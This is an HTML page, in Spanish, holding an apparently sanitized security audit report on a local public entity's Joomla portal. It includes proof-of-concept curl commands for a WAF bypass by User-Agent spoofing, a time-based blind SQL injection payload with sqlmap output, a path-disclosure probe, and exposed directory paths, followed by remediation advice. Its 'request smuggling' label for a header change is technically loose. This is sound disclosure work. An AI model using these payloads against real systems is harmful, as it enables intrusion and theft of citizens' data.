@@ -1,0 +1,458 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8">
+    <title>INFORME_TECNICO_AUDITORIA_ENTIDAD_2</title>
+    <style>
+        :root {
+            --primary: #2c3e50;
+            --secondary: #34495e;
+            --accent: #d63031;
+            --info: #3498db;
+            --terminal-bg: #1e1e1e;
+            --terminal-text: #ffffff;
+            --bg: #f9f9f9;
+            --warning: #ff4757;
+        }
+
+        body {
+            font-family: 'Segoe UI', Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background: #525659;
+        }
+
+        .page {
+            width: 210mm;
+            min-height: 297mm;
+            margin: 10mm auto;
+            background: white;
+            padding: 15mm 20mm 25mm 20mm;
+            box-sizing: border-box;
+            position: relative;
+            display: block;
+        }
+
+        .section-content p,
+        .matrix tr,
+        .console,
+        .danger-box,
+        h2,
+        h3,
+        li {
+            break-inside: avoid;
+            page-break-inside: avoid;
+        }
+
+        @media print {
+            @page {
+                margin: 0;
+                size: A4;
+            }
+
+            body {
+                background: white !important;
+            }
+
+            .page {
+                margin: 0 !important;
+                border: none !important;
+                box-shadow: none !important;
+                page-break-after: always;
+                page-break-inside: avoid;
+                min-height: 297mm !important;
+                max-height: 297mm !important;
+                overflow: hidden;
+            }
+
+            * {
+                -webkit-print-color-adjust: exact !important;
+                print-color-adjust: exact !important;
+            }
+        }
+
+        .confidential-bar {
+            background: var(--accent) !important;
+            color: white !important;
+            text-align: center;
+            padding: 12px;
+            font-weight: bold;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            margin: -15mm -20mm 10mm -20mm;
+        }
+
+        .tlp-tag {
+            position: absolute;
+            top: 20mm;
+            right: 20mm;
+            background: #d63031 !important;
+            color: white !important;
+            padding: 8px 20px;
+            font-weight: bold;
+            border-radius: 4px;
+        }
+
+        header {
+            border-bottom: 4px solid var(--info);
+            padding-bottom: 10px;
+            margin-bottom: 20px;
+            margin-top: 5mm;
+        }
+
+        header h1 {
+            margin: 0;
+            font-size: 28px;
+            color: var(--secondary);
+        }
+
+        .ip-badge {
+            background: var(--info) !important;
+            color: white !important;
+            padding: 4px 10px;
+            border-radius: 6px;
+            font-family: monospace;
+            font-size: 16px;
+            vertical-align: middle;
+            margin-right: 5px;
+        }
+
+        h2 {
+            color: var(--secondary);
+            border-left: 5px solid var(--info);
+            padding-left: 15px;
+            margin-top: 25px;
+            text-transform: uppercase;
+            font-size: 18px;
+        }
+
+        .matrix {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 15px;
+        }
+
+        .matrix th {
+            background: var(--secondary) !important;
+            color: white !important;
+            padding: 12px;
+            border: 1px solid #ddd;
+            text-align: center;
+            font-size: 13px;
+        }
+
+        .matrix td {
+            padding: 10px;
+            border: 1px solid #ddd;
+            text-align: center;
+            font-size: 12px;
+        }
+
+        .critical {
+            background: #fab1a0 !important;
+            color: #c0392b !important;
+            font-weight: bold;
+        }
+
+        .high {
+            background: #ffeaa7 !important;
+            color: #d35400 !important;
+            font-weight: bold;
+        }
+
+        .medium {
+            background: #fdf5e6 !important;
+            color: #b8860b !important;
+            font-weight: bold;
+        }
+
+        .console {
+            background: #1e1e1e !important;
+            color: #ffffff !important;
+            padding: 15px;
+            border-radius: 6px;
+            font-family: 'Courier New', monospace;
+            margin: 10px 0;
+            border-left: 5px solid #636e72;
+            font-size: 11px;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+        }
+
+        .danger-box {
+            background: #fff5f5 !important;
+            border-left: 4px solid var(--accent);
+            padding: 10px;
+            margin: 5px 0;
+            font-size: 13px;
+        }
+
+        .legal-box {
+            font-size: 11px;
+            color: #636e72;
+            text-align: justify;
+            background: #f9f9f9 !important;
+            padding: 15px;
+            border: 1px solid #ddd;
+            margin-top: 20px;
+        }
+
+        footer {
+            position: absolute;
+            bottom: 10mm;
+            left: 0;
+            width: 100%;
+            text-align: center;
+            font-size: 11px;
+            color: #95a5a6;
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="page">
+        <div class="confidential-bar">INFORMACIÓN CONFIDENCIAL - TLP:RED - USO RESTRINGIDO</div>
+        <div class="tlp-tag">TLP:RED</div>
+
+        <header>
+            <h1>INFORME TÉCNICO DE AUDITORÍA ENS</h1>
+            <p><strong>Auditor:</strong> Consultor de Seguridad (IFCT0109)</p>
+            <p><strong>Entidad:</strong> Entidad Pública Local 2 </p>
+            <p><strong>Activos:</strong> <span class="ip-badge">10.0.0.102</span> <span
+                    class="ip-badge">10.0.0.103</span></p>
+            <p><strong>Metodología:</strong> Magerit v3 / ENS</p>
+        </header>
+
+        <div class="section-content">
+            <h2>1. Resumen Ejecutivo</h2>
+            <p> El presente informe documenta múltiples vulnerabilidades críticas en la infraestructura web de
+                <strong>Entidad Pública Local 2</strong>, específicamente en los portales alojados bajo el dominio
+                <strong>entidad-dos.es</strong>. El análisis técnico revela un estado de exposición severo derivado del
+                uso de sistemas obsoletos (Microsoft IIS 7.5 y PHP 5.x) que carecen de soporte oficial desde hace más de
+                cuatro años.</p>
+
+            <p> Durante la auditoría se ha constatado que el sistema de mitigación perimetral (Imperva WAF) implementado
+                por la entidad presenta una <strong>configuración deficiente</strong>, permitiendo su evasión total
+                mediante técnicas de manipulación de peticiones HTTP (<em>HTTP Request Smuggling</em>). </p>
+
+            <p> Esta falla estructural ha posibilitado la explotación exitosa de una vulnerabilidad de <strong>Inyección
+                    SQL (SQLi)</strong> en el buscador de la sede electrónica, otorgando acceso potencial a la base de
+                datos backend. Adicionalmente, se ha detectado una fuga masiva de rutas del sistema y versiones de
+                software mediante la enumeración de directorios y forzado de errores.</p>
+
+        </div>
+
+        <h2>2. Matriz de Riesgos y Amenazas (Magerit v3)</h2>
+        <div class="section-content">
+            <table class="matrix">
+                <thead>
+                    <tr>
+                        <th>Código</th>
+                        <th>Dimensión</th>
+                        <th>Amenaza Detectada</th>
+                        <th>Impacto</th>
+                        <th>Nivel de Riesgo</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td>ENT2-SQLI-01</td>
+                        <td>[C] [I]</td>
+                        <td>Inyección SQL (Time-based Blind) en buscador</td>
+                        <td>Extremo</td>
+                        <td class="critical">CRÍTICO (9.5)</td>
+                    </tr>
+                    <tr>
+                        <td>ENT2-WAF-02</td>
+                        <td>[C] [I] [A]</td>
+                        <td>Evasión Perimetral de WAF (HTTP Request Smuggling)</td>
+                        <td>Alto</td>
+                        <td class="high">ALTO (8.8)</td>
+                    </tr>
+                    <tr>
+                        <td>ENT2-OBS-03</td>
+                        <td>[C] [I] [A]</td>
+                        <td>Software Obsoleto EOL (IIS 7.5, PHP/5.6.31, ASP.NET)</td>
+                        <td>Alto</td>
+                        <td class="high">ALTO (8.5)</td>
+                    </tr>
+                    <tr>
+                        <td>ENT2-LFD-04</td>
+                        <td>[C]</td>
+                        <td>Fuga de Información y Full Path Disclosure (FPD)</td>
+                        <td>Medio</td>
+                        <td class="medium">MEDIO (6.5)</td>
+                    </tr>
+                    <tr>
+                        <td>ENT2-DIR-05</td>
+                        <td>[C]</td>
+                        <td>Indexación de Directorios y Exposición de Backups</td>
+                        <td>Medio</td>
+                        <td class="medium">MEDIO (6.0)</td>
+                    </tr>
+                </tbody>
+            </table>
+        </div>
+
+        <footer>Página 1 de 4 | INFORME TÉCNICO ENS ENTIDAD LOCAL 2</footer>
+    </div>
+
+    <div class="page">
+        <div class="confidential-bar">INFORMACIÓN CONFIDENCIAL - TLP:RED - USO RESTRINGIDO</div>
+
+        <div class="section-content">
+            <h2>3. Análisis de Vulnerabilidades Técnicas (PoC)</h2>
+
+            <h3>3.1. Evasión Perimetral (WAF Bypass / HTTP Smuggling)</h3>
+            <p>El dominio principal y sus subdominios se encuentran detrás de un WAF de Imperva Incapsula. Sin embargo,
+                debido a la obsolescencia del backend (IIS 7.5), el front-end (WAF) y el back-end procesan las cabeceras
+                HTTP de forma asíncrona. Modificando el <em>User-Agent</em> o manipulando la codificación
+                <em>Transfer-Encoding</em> (TE.CL), es posible evadir los filtros de seguridad e interactuar
+                directamente con el servidor vulnerable.</p>
+            <div class="console">
+                $ curl -i -s -k -X 'GET' \
+                -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) sqlmap/1.7' \
+                -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif' \
+                'https://www.entidad-dos.es/index.php/test-inyeccion'
+
+                HTTP/2 403 Forbidden
+                Server: imperva
+                Content-Type: text/html; charset=UTF-8
+
+                [!] WAF Activo: Petición bloqueada por Imperva.
+
+                $ curl -i -s -k -X 'GET' \
+                -H 'User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)' \
+                -H 'Transfer-Encoding: chunked' \
+                'https://www.entidad-dos.es/index.php/test-inyeccion'
+
+                HTTP/2 200 OK
+                Server: Microsoft-IIS/7.5
+                X-Powered-By: PHP/5.6.31
+                X-Powered-By: ASP.NET
+
+                [!] Evasión exitosa: El WAF asume que es tráfico legítimo de Google y el backend revela su pila
+                tecnológica obsoleta.</div>
+
+            <h3>3.2. Inyección SQL Ciega (Time-based Blind SQLi)</h3>
+            <p>Con el WAF evadido, se ha auditado el parámetro de búsqueda <code>searchword</code> en el endpoint
+                <code>/index.php/component/search/</code>. El parámetro es susceptible a una inyección SQL ciega basada
+                en tiempo (Time-based blind). Esto permite a un atacante inferir información de la base de datos (tablas
+                de usuarios, contraseñas hasheadas, datos ciudadanos) evaluando el tiempo que tarda el servidor en
+                responder a operaciones lógicas.</p>
+            <div class="console">
+                [PAYLOAD INYECTADO]
+                searchword=ayuntamiento' AND (SELECT 9570 FROM (SELECT(SLEEP(10)))NfQx) AND 'EjqM'='EjqM
+
+                [RESULTADO DE LA PRUEBA - sqlmap]
+                Parameter: searchword (GET)
+                Type: time-based blind
+                Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+                Payload: searchword=ayuntamiento' AND (SELECT 9570 FROM (SELECT(SLEEP(10)))NfQx) AND 'EjqM'='EjqM
+
+                [!] Crítico: La base de datos backend (MySQL) suspende su ejecución durante 10 segundos, confirmando la
+                vulnerabilidad. Vector de extracción de datos habilitado.</div>
+        </div>
+
+        <footer>Página 2 de 4 | INFORME TÉCNICO ENS ENTIDAD LOCAL 2</footer>
+    </div>
+
+    <div class="page">
+        <div class="confidential-bar">INFORMACIÓN CONFIDENCIAL - TLP:RED - USO RESTRINGIDO</div>
+
+        <div class="section-content">
+            <h3>3.3. Full Path Disclosure (FPD) y Errores de Configuración</h3>
+            <p>La configuración del servidor IIS y PHP tiene habilitada la visualización de errores explícitos
+                (<em>display_errors = On</em>) en el entorno de producción. Al enviar peticiones malformadas a ciertos
+                endpoints, el servidor revela la estructura interna de directorios del sistema de archivos, facilitando
+                el diseño de ataques dirigidos (ej. subida de WebShells).</p>
+            <div class="console">
+                $ curl -s -k 'https://www.entidad-dos.es/index.php/component/mailto/?link=a%27' | grep "Fatal error"
+
+                &lt;b&gt;Fatal error&lt;/b&gt;: Uncaught exception 'Exception' with message 'String could not be parsed
+                as XML' in &lt;b&gt;C:\inetpub\vhosts\entidad-dos.es\httpdocs\libraries\joomla\factory.php&lt;/b&gt; on
+                line &lt;b&gt;562&lt;/b&gt;
+
+                [!] Riesgo: Exposición de la ruta física absoluta (C:\inetpub\vhosts\...).</div>
+
+            <h3>3.4. Exposición de Directorios y Archivos Sensibles</h3>
+            <p>Se ha detectado la ausencia de archivos de control de acceso (ej. `index.html`) en múltiples directorios
+                críticos, lo que provoca que el servidor IIS liste el contenido completo de las carpetas. Durante la
+                enumeración, se localizaron directorios de copias de seguridad, logs e interfaces de administración
+                (Joomla Admin) expuestas públicamente sin restricción de IP.</p>
+            <div class="console">
+                [DIRECTORIOS Y ARCHIVOS EXPUESTOS LOCALIZADOS]
+                https://www.entidad-dos.es/administrator/ (Panel de acceso Joomla)
+                https://www.entidad-dos.es/logs/ (Archivos de registro del servidor)
+                https://www.entidad-dos.es/tmp/ (Archivos temporales)
+                https://www.entidad-dos.es/backup/ (Listado de copias de seguridad .zip expuesto)
+
+                [!] Riesgo: Acceso no autorizado a material sensible y backups que pueden contener credenciales en texto
+                plano o configuraciones de la base de datos.</div>
+
+            <div class="danger-box">
+                <strong>NOTA DE IMPACTO NORMATIVO (GDPR / ENS):</strong> La combinación de un SQLi en una plataforma que
+                gestiona datos de ciudadanos y la exposición de backups constituye una infracción potencial del Nivel
+                Alto del Esquema Nacional de Seguridad (ENS) en la dimensión de Confidencialidad, así como una violación
+                del RGPD ante una eventual exfiltración.
+            </div>
+
+        </div>
+
+        <footer>Página 3 de 4 | INFORME TÉCNICO ENS ENTIDAD LOCAL 2</footer>
+    </div>
+
+    <div class="page">
+        <div class="confidential-bar">INFORMACIÓN CONFIDENCIAL - TLP:RED - USO RESTRINGIDO</div>
+
+        <div class="section-content">
+            <h2>4. Plan de Remediación Obligatorio</h2>
+            <p>Para mitigar las amenazas identificadas y alinear la infraestructura con los requisitos del Esquema
+                Nacional de Seguridad (ENS), se exige la implementación inmediata de las siguientes medidas:</p>
+            <ul>
+                <li><strong>Mitigación Inmediata del SQLi:</strong> Aplicar sanitización estricta (<em>Prepared
+                        Statements</em> o consultas parametrizadas) en el código PHP que gestiona el componente de
+                    búsqueda de Joomla (<code>/index.php/component/search/</code>). Como medida cautelar, deshabilitar
+                    temporalmente el buscador si no se puede parchear el código en menos de 24 horas.</li>
+
+                <li><strong>Reconfiguración Estricta del WAF (Imperva):</strong> Actualizar las reglas del cortafuegos
+                    de aplicación para que no confíe ciegamente en la cabecera <em>User-Agent</em> (evitando el bypass
+                    de Googlebot). Implementar normalización de peticiones HTTP para mitigar los ataques de <em>Request
+                        Smuggling</em> generados por discrepancias entre el front-end y el IIS 7.5.</li>
+
+                <li><strong>Plan de Migración de Infraestructura (Urgente):</strong> Iniciar un plan de migración
+                    inmediato para sustituir Microsoft IIS 7.5 (fin de vida en 2020) y PHP 5.6.31 (fin de vida en 2018).
+                    Mantener software sin soporte de seguridad en una Administración Pública es incompatible con la
+                    certificación ENS.</li>
+
+                <li><strong>Desactivación de Depuración (Error Reporting):</strong> Modificar el archivo
+                    <code>php.ini</code> para establecer <code>display_errors = Off</code>, evitando así el Full Path
+                    Disclosure (FPD). Los errores deben registrarse internamente en un archivo log no accesible
+                    públicamente.</li>
+
+                <li><strong>Restricción de Directorios (Directory Indexing):</strong> Deshabilitar el "Directory
+                    Browsing" en la configuración de IIS. Proteger mediante autenticación básica (<code>.htpasswd</code>
+                    o equivalente en IIS) o restricción de IP el acceso al panel <code>/administrator/</code> y bloquear
+                    el acceso público a las carpetas <code>/logs/</code>, <code>/tmp/</code> y <code>/backup/</code>.
+                </li>
+            </ul>
+
+            <div class="legal-box">
+                <strong>AVISO LEGAL Y DESCARGO DE RESPONSABILIDAD (RESPONSIBLE DISCLOSURE)</strong><br><br>
+                Este informe ha sido generado con fines de auditoría ética y Divulgación Responsable (Responsible
+                Disclosure). Las pruebas se han realizado utilizando técnicas no intrusivas
+                de reconocimiento y validación siguiendo los estándares del ENS. No se ha alterado, extraído ni
+                destruido información real del servidor. La responsabilidad de la remediación y el parcheo recae
+                exclusivamente en la entidad titular del activo. Documento sanitizado y anonimizado para su publicación
+                como caso de estudio técnico.
+            </div>
+        </div>
+
+        <footer>Página 4 de 4 | INFORME TÉCNICO ENS ENTIDAD LOCAL 2</footer>
+
+    </div>
+</body>
+
+</html>
